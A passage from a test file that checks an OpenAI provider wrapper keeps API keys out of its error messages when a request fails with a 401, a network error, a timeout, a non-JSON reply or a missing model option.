      ['openai 401 echoing the key', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(() => json({ error: { message: `Incorrect API key provided: ${ok}`, type: 'invalid_request_error', code: 'invalid_api_key' } }, 401)).fetch }).complete(request())],
      ['openai network error naming the key', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(throwing(ok)).fetch }).complete(request())],
      ['openai timeout', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(hang).fetch }).complete(request({ timeoutMs: 30 }))],
      ['openai answer not JSON, quoting the key', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(() => json({ choices: [{ message: { content: ok }, finish_reason: 'stop' }] })).fetch }).complete(request())],
      ['openai without --model', async () => makeProvider({ ai: 'openai', env: envOf(undefined, ok) })],
    ];
    for (const [label, run] of cases) {
      const err = await caught(run);
      for (const key of [ak, ok]) {
        expect(err.message, label).not.toContain(key);
        expect(String(err), label).not.toContain(key);
        expect(inspect(err, { depth: 10 }), label).not.toContain(key);
      }
    }
  });
});
